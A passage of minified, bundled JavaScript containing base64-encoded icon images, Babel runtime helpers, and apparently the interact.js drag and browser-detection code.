    "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADAAAAAwBAMAAAClLOS0AAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAAAIVBMVEUAAACAgIDAwMAAgID///8AgAAAAP+AAAAAAAD/AAAAAIBSZDZVAAAAAXRSTlMAQObYZgAAAAFiS0dEBI9o2VEAAAAHdElNRQfiBhgXETDh3DywAAABh0lEQVQ4y23TsWrDMBAGYPsNqmCC6CbZBa8NNHuEGrq24FK81tbgsXTJ5pQMmUsgT+Bg/JQ9SSdbqn2Q5f/y54QjR5Edoj8wd1Ew8d2KRISnafpI/JzELOGEb8Sb4IUvKyK0PGRpAeMJhEaei20NMu1JJEqhdOV1gq9RdKNoR7j+jqLnY4TD4duXrh0b14tEoQBl7zes/GgoEGLbAKEAT9AoWwRhGlLmAPW0JEmkuPhQlvZcq0Ti5Lij6yfYO/jcQqN0P+WDqovOLIl5ADel8FhxamCPUDZK1baxsbDH5YNSTdBwcFNN0y3Bu1LDYIDMGwaIDAAKN9MgMmyslW1AHsJxbRvwp4VwPt4PQ29vSFL5cHqxwCVLqsrBkZ52FCHz4XzaEWoO5cA8rBy+T/6Dfr65zgF6c2+50MCBRKbzEAQI5gCtByCYE9rbV4BnmawyziXmhLYORCYBGHFgbsKZa+FiBigLYIVPQMf3RssEU+6EzXIUNs+tsIXcCFvKtbDFHIQt5yBB/ge5pdMZ3n2ecAAAACV0RVh0ZGF0ZTpjcmVhdGUAMjAxOC0wNi0yNFQyMzoxNzo0OC0wNDowMM+D9pEAAAAldEVYdGRhdGU6bW9kaWZ5ADIwMTgtMDYtMjRUMjM6MTc6NDgtMDQ6MDC+3k4tAAAAAElFTkSuQmCC",
  Ur = Object.freeze(
    Object.defineProperty(
      { __proto__: null, default: Hw },
      Symbol.toStringTag,
      { value: "Module" }
    )
  ),
  Vw =
    "data:image/webp;base64,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",
  Hr = Object.freeze(
    Object.defineProperty(
      { __proto__: null, default: Vw },
      Symbol.toStringTag,
      { value: "Module" }
    )
  ),
  lf =
    "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADAAAAAwBAMAAAClLOS0AAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAAAJ1BMVEUAAACAgIDAwMD///8AAAAAgICAAICAgAAAAICAAAAA//8AAP//AACkLexpAAAAAXRSTlMAQObYZgAAAAFiS0dEAxEMTPIAAAAHdElNRQfiBBMBIhJ1vRPHAAABzklEQVQ4y9WTv2sbMRTHz6XZ82T5rFWqS4o79bxlspznq0MnG58T8BQIqVd3CAQyREFptGYqXQ+83Jyh0D+g/1b143S2afeQ73DD+/DRk550SfLyAYD/ld/wLBO0CJlt6y3SFkJwCSHYAJKeucy7Puv1sK4fZF2Ne6nJAf8qdsOPaAAs/bYHCAmLtZgmscRDjjxoCzpZ4b9NWhkjWpn8OmRxHkFbgOpNmKwbm8YgnFGCD4/C2NwDorq5mbszEgFG9XIlJnYckqKClTF6GAzojB/F5N1gI1ESuri6utS1Ac7oVxtE4LntAeYwGMQZdikr9FZFsZTsbmv47agsHZN+8Qxqa7jQ0ad8KsTmN1HB6FgjglmWlctRNL589ndB73lOBmVZjGoD4pCUA1W1PIlGELrUgawqi5PYox6VB/09I4J1PuuX5XPcFVgDwA4X4XtHVB81uWsMjkjsp8sk4b/kh8OmBz398yQEk2v3YghNGoP+uLXrcQ0p4gUfJk2PAATDCwBOkx3j9KcDnDVXW/fwzR0BjXq4Y/jt+kdNJTQGhJPzMDDJ/bsCa+hwcp4v0nRxOfJGQtGYONxxNTh+P5fUg7euYkJQTadT1Ntf59XkL7hXsT3cCr1SAAAAJXRFWHRkYXRlOmNyZWF0ZQAyMDE4LTA0LTE5VDAxOjM0OjE4LTA0OjAwm26U/QAAACV0RVh0ZGF0ZTptb2RpZnkAMjAxOC0wNC0xOVQwMTozNDoxOC0wNDowMOozLEEAAAAASUVORK5CYII=",
  Vr = Object.freeze(
    Object.defineProperty(
      { __proto__: null, default: lf },
      Symbol.toStringTag,
      { value: "Module" }
    )
  ),
  cf =
    "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADAAAAAwCAMAAABg3Am1AAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAAAOVBMVEUAAACGhoYiIiL/+/DAwMD4+PiAgAD//5nMzGaZmQDn59YAM5mgoKQAMzMAAAD/zJkICAgzMwD///8PLrXJAAAAAXRSTlMAQObYZgAAAAFiS0dEEnu8bAAAAAAHdElNRQfiBhgXAzXpQrjsAAABbklEQVRIx8WU63KFIAyEtVoj1rr1/V+2QAImXBztn64zRxz3I5vgnGH4N40fL/3T/IoYp+kVMX5Or4iw/xsi+W+J5dLlvyEWSlq1v0t4/8py1t8hav/2dUsstX/XNbi3BtD0B8L5l8t3BRi/ClUTDBT+XTElEYGGf7c1LFD6NxssEAZw48YKVvHP8hTlCQ24cWZ5G//kRVQkBHBPxEQE3PRAxMTBAHUFucH3yDV6AOwahAjEGhUAY+QbYRXipxcJKlG4bgGwNZfwF5DbtgCKFTIWgJsxXQ3IImRifwlkX3pKodx8nAWAEpMJxZOAO86zrgANQvXtK5wtwA6HJBC4CQHamVISNdkGoF7n/LwCagD5eNMwoQ+OehXSvqZhGykT0K2wn/stIjUHm4tAl1AAVBNpAR6TxCqA8pujnIXNpAEhQOYLJb07oQDyB5fTX/mlRq9CagN6otQA9GlRmmbam58v4NmfmVPAcD7S8Bf9AlndNmHeYjB7AAAAJXRFWHRkYXRlOmNyZWF0ZQAyMDE4LTA2LTI0VDIzOjAzOjUzLTA0OjAwyUvdTwAAACV0RVh0ZGF0ZTptb2RpZnkAMjAxOC0wNi0yNFQyMzowMzo1My0wNDowMLgWZfMAAAAASUVORK5CYII=",
  Qr = Object.freeze(
    Object.defineProperty(
      { __proto__: null, default: cf },
      Symbol.toStringTag,
      { value: "Module" }
    )
  ),
  Qw =
    "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAAAn1BMVEUEBARmmZkEBAT//////8zAwMD/+/Dn59aZmcxmzP+ZzP+Z///MzP/M7P/M//+myvCtqZDA3MCysrLj4+Pq6uozZjOZmWbx8fHd3d1mZjPMzJkAmQA5OTmGhoaWlpZmmQAzMwDX19dmzDMzZgAzADN3d3dCQkIzmQDMzDNmADPMzMyZAMxmM8wAZgBmmWb/zJn//5nv1sbMzGbMmWaZmQDRaygJAAAAAXRSTlMAQObYZgAAAAFiS0dEAxEMTPIAAAAHdElNRQfiBhoANySLuBaXAAABFklEQVQ4y72T2VaDMBRFKWUIN4RWEWpIK7GhUgSlYv//28wFB4YFPukOD1lrb84TGMbfs1rGNFbrWay1ZWPgzGDpsxSgX1qwBgsumTJYcIkHFKhPWcAY3egrEPTuTwAe+EAZ1Z5RffVwwR0s+F8L2xssCPr+AoB9GzIWBHdRDLADgr4X2Pew5RwXErE/hA9bgr4X8APwVD7SkB1Vtj/xJ4K+F8j8dE4Lzo7nSKhCiYi4wyDPZK6EfJapKJXMeDkOVCmkUCKTsoqqF/mqxoF+rSpUpZL68nap9RkHPG4SFPhoknoc1J8y0adBJkErm1a+I+Og6WjdNb7G8TiYMgzm+P6idt1xnZmg887Et4G9iGmYv/AP/+4HWvYoXh4iozkAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDYtMjZUMDA6NTU6MzYtMDQ6MDD6UapqAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTA2LTI2VDAwOjU1OjM2LTA0OjAwiwwS1gAAAABJRU5ErkJggg==",
  Xw =
    "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADAAAAAwBAMAAAClLOS0AAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAAAGFBMVEUAAACZmQAAAAD4+Pj//5nMzGb/zJn////5no2yAAAAAXRSTlMAQObYZgAAAAFiS0dEBxZhiOsAAAAHdElNRQfiBhgXARMJeV+TAAABE0lEQVQ4y82TzQ3CMAyFywhtxb1iA1QWQLJ858AGlvcfAfs5aRMTceapaoVfPv9FTNMPzdDyFb/s0H3LxkqhjFwexXhuYyAjB5CRE0jI9X3qNVfZkXUfautSFQkzL9nwIAlJNixExKSJELGgQJlge9jzJQPnzeoJL4uPDAiORB3B3pM34J52hADg1BVXE3ZbA785sCZVBULt5BwtAUuTCypEiSNVNCmM8UTTrsxTL66kzRyOYOGoXYuXRB40wLrVbkAUttdRg33dFL16Lj264siF9OThZkBcKqFVrYSfjWVo7MuIdkBcNoBzV1K2YQQ+Gqk8HPtGYXZIK1EuNJwyIGagGE2RSNHudR5qmW5jff2F/1wfr4rjk5A1shsAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDYtMjRUMjM6MDE6MTktMDQ6MDDthFzGAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTA2LTI0VDIzOjAxOjE5LTA0OjAwnNnkegAAAABJRU5ErkJggg==",
  Zw =
    "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAQAAADZc7J/AAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAAAAmJLR0QA/4ePzL8AAAAHdElNRQfiBhgXBwzSK/XgAAAAjElEQVRIx+2VQQrAIAwE1+K/oz9rX5ZeiopaTazFHronETMOIRCDK44hiDP5jY1H6pZ7gJEhNsm/iQHAjwBUIJSAEmF15aEBoRcqAwKDwdiTu8LAdxB5bP9JOwoDkgFeNKjD5xvc2wh7oLVRGNSR8w2+PImr54BGAP8cyLLeQL1YGgbHECDuWtF6LytPTdMhXzC2L6sAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDYtMjRUMjM6MDc6MTItMDQ6MDDinXh7AAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTA2LTI0VDIzOjA3OjEyLTA0OjAwk8DAxwAAAABJRU5ErkJggg==",
  qw =
    "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADAAAAAwBAMAAAClLOS0AAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAAAFVBMVEUAAACAgID///8AAADAwMD//wD/AADaas4dAAAAAXRSTlMAQObYZgAAAAFiS0dEAmYLfGQAAAAHdElNRQfiBhoANxc0aHeBAAAA6klEQVQ4y93SzZHDIAwFYDLZBjA0sIq8ZxvUgGWlA5ew/dewIBv/BR8zk9l3g28eg4WN0dhDzJYGdvnursBdwa5yBHBXsFVOsFXOsFaOEFNqkDP+A2CF7gWwUXC39UUXkBmaoKteRILOD9sZPElOnxYOwAfgqeEMfa/H5IazlgO2T68Q73nI0WZ4PDDwNM3Q3bXhM4yjUPtcGuaGskRhKo09OOf7YRiqQD6lApZ2jZ/fvEtELl2OpNZI30m8NdZZJRiFsTRMLCEBFIbSMOZLxM+HpdEyYBUQFOsviFcA/Ik/3JvAyykF4kv+AHQjkDNA/Y/7AAAAJXRFWHRkYXRlOmNyZWF0ZQAyMDE4LTA2LTI2VDAwOjU1OjIzLTA0OjAwZMOFUwAAACV0RVh0ZGF0ZTptb2RpZnkAMjAxOC0wNi0yNlQwMDo1NToyMy0wNDowMBWePe8AAAAASUVORK5CYII=";
var Kw =
  typeof globalThis < "u"
    ? globalThis
    : typeof window < "u"
    ? window
    : typeof global < "u"
    ? global
    : typeof self < "u"
    ? self
    : {};
function $w(e) {
  return e && e.__esModule && Object.prototype.hasOwnProperty.call(e, "default")
    ? e.default
    : e;
}
var wr = { exports: {} };
wr.exports,
  (function (e, t) {
    e.exports = (function () {
      function n(s, r) {
        var l = Object.keys(s);
        if (Object.getOwnPropertySymbols) {
          var c = Object.getOwnPropertySymbols(s);
          r &&
            (c = c.filter(function (d) {
              return Object.getOwnPropertyDescriptor(s, d).enumerable;
            })),
            l.push.apply(l, c);
        }
        return l;
      }
      function o(s) {
        for (var r = 1; r < arguments.length; r++) {
          var l = null != arguments[r] ? arguments[r] : {};
          r % 2
            ? n(Object(l), !0).forEach(function (c) {
                p(s, c, l[c]);
              })
            : Object.getOwnPropertyDescriptors
            ? Object.defineProperties(s, Object.getOwnPropertyDescriptors(l))
            : n(Object(l)).forEach(function (c) {
                Object.defineProperty(
                  s,
                  c,
                  Object.getOwnPropertyDescriptor(l, c)
                );
              });
        }
        return s;
      }
      function i(s) {
        return (i =
          "function" == typeof Symbol && "symbol" == typeof Symbol.iterator
            ? function (r) {
                return typeof r;
              }
            : function (r) {
                return r &&
                  "function" == typeof Symbol &&
                  r.constructor === Symbol &&
                  r !== Symbol.prototype
                  ? "symbol"
                  : typeof r;
              })(s);
      }
      function a(s, r) {
        if (!(s instanceof r))
          throw new TypeError("Cannot call a class as a function");
      }
      function u(s, r) {
        for (var l = 0; l < r.length; l++) {
          var c = r[l];
          (c.enumerable = c.enumerable || !1),
            (c.configurable = !0),
            "value" in c && (c.writable = !0),
            Object.defineProperty(s, G(c.key), c);
        }
      }
      function f(s, r, l) {
        return (
          r && u(s.prototype, r),
          l && u(s, l),
          Object.defineProperty(s, "prototype", { writable: !1 }),
          s
        );
      }
      function p(s, r, l) {
        return (
          (r = G(r)) in s
            ? Object.defineProperty(s, r, {
                value: l,
                enumerable: !0,
                configurable: !0,
                writable: !0,
              })
            : (s[r] = l),
          s
        );
      }
      function v(s, r) {
        if ("function" != typeof r && null !== r)
          throw new TypeError(
            "Super expression must either be null or a function"
          );
        (s.prototype = Object.create(r && r.prototype, {
          constructor: { value: s, writable: !0, configurable: !0 },
        })),
          Object.defineProperty(s, "prototype", { writable: !1 }),
          r && w(s, r);
      }
      function y(s) {
        return (y = Object.setPrototypeOf
          ? Object.getPrototypeOf.bind()
          : function (r) {
              return r.__proto__ || Object.getPrototypeOf(r);
            })(s);
      }
      function w(s, r) {
        return (w = Object.setPrototypeOf
          ? Object.setPrototypeOf.bind()
          : function (l, c) {
              return (l.__proto__ = c), l;
            })(s, r);
      }
      function x(s) {
        if (void 0 === s)
          throw new ReferenceError(
            "this hasn't been initialised - super() hasn't been called"
          );
        return s;
      }
      function k(s) {
        var r = (function () {
          if (
            typeof Reflect > "u" ||
            !Reflect.construct ||
            Reflect.construct.sham
          )
            return !1;
          if ("function" == typeof Proxy) return !0;
          try {
            return (
              Boolean.prototype.valueOf.call(
                Reflect.construct(Boolean, [], function () {})
              ),
              !0
            );
          } catch {
            return !1;
          }
        })();
        return function () {
          var l,
            c = y(s);
          if (r) {
            var d = y(this).constructor;
            l = Reflect.construct(c, arguments, d);
          } else l = c.apply(this, arguments);
          return (function (h, g) {
            if (g && ("object" == typeof g || "function" == typeof g)) return g;
            if (void 0 !== g)
              throw new TypeError(
                "Derived constructors may only return object or undefined"
              );
            return x(h);
          })(this, l);
        };
      }
      function D() {
        return (
          (D =
            typeof Reflect < "u" && Reflect.get
              ? Reflect.get.bind()
              : function (s, r, l) {
                  var c = (function (h, g) {
                    for (
                      ;
                      !Object.prototype.hasOwnProperty.call(h, g) &&
                      null !== (h = y(h));

                    );
                    return h;
                  })(s, r);
                  if (c) {
                    var d = Object.getOwnPropertyDescriptor(c, r);
                    return d.get
                      ? d.get.call(arguments.length < 3 ? s : l)
                      : d.value;
                  }
                }),
          D.apply(this, arguments)
        );
      }
      function G(s) {
        var r = (function (l, c) {
          if ("object" != typeof l || null === l) return l;
          var d = l[Symbol.toPrimitive];
          if (void 0 !== d) {
            var h = d.call(l, c || "default");
            if ("object" != typeof h) return h;
            throw new TypeError("@@toPrimitive must return a primitive value.");
          }
          return ("string" === c ? String : Number)(l);
        })(s, "string");
        return "symbol" == typeof r ? r : r + "";
      }
      var q = function (s) {
          return !(!s || !s.Window) && s instanceof s.Window;
        },
        ie = void 0,
        te = void 0;
      function E(s) {
        ie = s;
        var r = s.document.createTextNode("");
        r.ownerDocument !== s.document &&
          "function" == typeof s.wrap &&
          s.wrap(r) === r &&
          (s = s.wrap(s)),
          (te = s);
      }
      function C(s) {
        return q(s) ? s : (s.ownerDocument || s).defaultView || te.window;
      }
      typeof window < "u" && window && E(window);
      var I = function (s) {
          return !!s && "object" === i(s);
        },
        W = function (s) {
          return "function" == typeof s;
        },
        M = {
          window: function (s) {
            return s === te || q(s);
          },
          docFrag: function (s) {
            return I(s) && 11 === s.nodeType;
          },
          object: I,
          func: W,
          number: function (s) {
            return "number" == typeof s;
          },
          bool: function (s) {
            return "boolean" == typeof s;
          },
          string: function (s) {
            return "string" == typeof s;
          },
          element: function (s) {
            if (!s || "object" !== i(s)) return !1;
            var r = C(s) || te;
            return /object|function/.test(
              typeof Element > "u" ? "undefined" : i(Element)
            )
              ? s instanceof Element || s instanceof r.Element
              : 1 === s.nodeType && "string" == typeof s.nodeName;
          },
          plainObject: function (s) {
            return (
              I(s) &&
              !!s.constructor &&
              /function Object\b/.test(s.constructor.toString())
            );
          },
          array: function (s) {
            return I(s) && void 0 !== s.length && W(s.splice);
          },
        };
      function U(s) {
        var r = s.interaction;
        if ("drag" === r.prepared.name) {
          var l = r.prepared.axis;
          "x" === l
            ? ((r.coords.cur.page.y = r.coords.start.page.y),
              (r.coords.cur.client.y = r.coords.start.client.y),
              (r.coords.velocity.client.y = 0),
              (r.coords.velocity.page.y = 0))
            : "y" === l &&
              ((r.coords.cur.page.x = r.coords.start.page.x),
              (r.coords.cur.client.x = r.coords.start.client.x),
              (r.coords.velocity.client.x = 0),
              (r.coords.velocity.page.x = 0));
        }
      }
      function B(s) {
        var r = s.iEvent,
          l = s.interaction;
        if ("drag" === l.prepared.name) {
          var c = l.prepared.axis;
          if ("x" === c || "y" === c) {
            var d = "x" === c ? "y" : "x";
            (r.page[d] = l.coords.start.page[d]),
              (r.client[d] = l.coords.start.client[d]),
              (r.delta[d] = 0);
          }
        }
      }
      var $ = {
          id: "actions/drag",
          install: function (s) {
            var r = s.actions,
              l = s.Interactable,
              c = s.defaults;
            (l.prototype.draggable = $.draggable),
              (r.map.drag = $),
              (r.methodDict.drag = "draggable"),
              (c.actions.drag = $.defaults);
          },
          listeners: {
            "interactions:before-action-move": U,
            "interactions:action-resume": U,
            "interactions:action-move": B,
            "auto-start:check": function (s) {
              var r = s.interaction,
                l = s.interactable,
                c = s.buttons,
                d = l.options.drag;
              if (
                d &&
                d.enabled &&
                (!r.pointerIsDown ||
                  !/mouse|pointer/.test(r.pointerType) ||
                  c & l.options.drag.mouseButtons)
              )
                return (
                  (s.action = {
                    name: "drag",
                    axis: "start" === d.lockAxis ? d.startAxis : d.lockAxis,
                  }),
                  !1
                );
            },
          },
          draggable: function (s) {
            return M.object(s)
              ? ((this.options.drag.enabled = !1 !== s.enabled),
                this.setPerAction("drag", s),
                this.setOnEvents("drag", s),
                /^(xy|x|y|start)$/.test(s.lockAxis) &&
                  (this.options.drag.lockAxis = s.lockAxis),
                /^(xy|x|y)$/.test(s.startAxis) &&
                  (this.options.drag.startAxis = s.startAxis),
                this)
              : M.bool(s)
              ? ((this.options.drag.enabled = s), this)
              : this.options.drag;
          },
          beforeMove: U,
          move: B,
          defaults: { startAxis: "xy", lockAxis: "xy" },
          getCursor: function () {
            return "move";
          },
          filterEventType: function (s) {
            return 0 === s.search("drag");
          },
        },
        Pe = $,
        pe = {
          init: function (s) {
            var r = s;
            (pe.document = r.document),
              (pe.DocumentFragment = r.DocumentFragment || Ce),
              (pe.SVGElement = r.SVGElement || Ce),
              (pe.SVGSVGElement = r.SVGSVGElement || Ce),
              (pe.SVGElementInstance = r.SVGElementInstance || Ce),
              (pe.Element = r.Element || Ce),
              (pe.HTMLElement = r.HTMLElement || pe.Element),
              (pe.Event = r.Event),
              (pe.Touch = r.Touch || Ce),
              (pe.PointerEvent = r.PointerEvent || r.MSPointerEvent);
          },
          document: null,
          DocumentFragment: null,
          SVGElement: null,
          SVGSVGElement: null,
          SVGElementInstance: null,
          Element: null,
          HTMLElement: null,
          Event: null,
          Touch: null,
          PointerEvent: null,
        };
      function Ce() {}
      var Oe = pe,
        Se = {
          init: function (s) {
            var r = Oe.Element,
              l = s.navigator || {};
            (Se.supportsTouch =
              "ontouchstart" in s ||
              (M.func(s.DocumentTouch) &&
                Oe.document instanceof s.DocumentTouch)),
              (Se.supportsPointerEvent =
                !1 !== l.pointerEnabled && !!Oe.PointerEvent),
              (Se.isIOS = /iP(hone|od|ad)/.test(l.platform)),
              (Se.isIOS7 =
                /iP(hone|od|ad)/.test(l.platform) &&
                /OS 7[^\d]/.test(l.appVersion)),
              (Se.isIe9 = /MSIE 9/.test(l.userAgent)),
              (Se.isOperaMobile =
                "Opera" === l.appName &&
                Se.supportsTouch &&
                /Presto/.test(l.userAgent)),
              (Se.prefixedMatchesSelector =
                "matches" in r.prototype
                  ? "matches"
                  : "webkitMatchesSelector" in r.prototype
                  ? "webkitMatchesSelector"
                  : "mozMatchesSelector" in r.prototype
                  ? "mozMatchesSelector"
                  : "oMatchesSelector" in r.prototype
                  ? "oMatchesSelector"
                  : "msMatchesSelector"),
              (Se.pEventTypes = Se.supportsPointerEvent
                ? Oe.PointerEvent === s.MSPointerEvent
                  ? {
                      up: "MSPointerUp",
                      down: "MSPointerDown",
                      over: "mouseover",
                      out: "mouseout",
                      move: "MSPointerMove",
                      cancel: "MSPointerCancel",
                    }
                  : {
                      up: "pointerup",
                      down: "pointerdown",
                      over: "pointerover",
                      out: "pointerout",
                      move: "pointermove",
                      cancel: "pointercancel",
                    }
                : null),
              (Se.wheelEvent =
                Oe.document && "onmousewheel" in Oe.document
                  ? "mousewheel"
                  : "wheel");
          },
          supportsTouch: null,
          supportsPointerEvent: null,
          isIOS7: null,
          isIOS: null,
          isIe9: null,
          isOperaMobile: null,
          prefixedMatchesSelector: null,
          pEventTypes: null,
          wheelEvent: null,
        },
        Z = Se;
      function we(s, r) {
        if (s.contains) return s.contains(r);
        for (; r; ) {
          if (r === s) return !0;
          r = r.parentNode;
        }
        return !1;
      }
      function ue(s, r) {
        for (; M.element(s); ) {
          if (vt(s, r)) return s;
          s = et(s);
        }
        return null;
      }
      function et(s) {
        var r = s.parentNode;
        if (M.docFrag(r)) {
          for (; (r = r.host) && M.docFrag(r); );
          return r;
        }
        return r;
      }
      function vt(s, r) {
        return (
          te !== ie && (r = r.replace(/\/deep\//g, " ")),
          s[Z.prefixedMatchesSelector](r)
        );
      }
      var Wt = function (s) {
        return s.parentNode || s.host;
      };
      function yt(s, r) {
        for (
          var l, c = [], d = s;
          (l = Wt(d)) && d !== r && l !== d.ownerDocument;

        )
          c.unshift(d), (d = l);
        return c;
      }
      function fo(s, r, l) {
        for (; M.element(s); ) {
          if (vt(s, r)) return !0;
          if ((s = et(s)) === l) return vt(s, r);
        }
        return !1;
      }
      function Si(s) {
        return s.correspondingUseElement || s;
      }
      function Bo(s) {
        var r =
          s instanceof Oe.SVGElement
            ? s.getBoundingClientRect()
            : s.getClientRects()[0];
        return (
          r && {
            left: r.left,
            right: r.right,
            top: r.top,
            bottom: r.bottom,
            width: r.width || r.right - r.left,
            height: r.height || r.bottom - r.top,
          }
        );
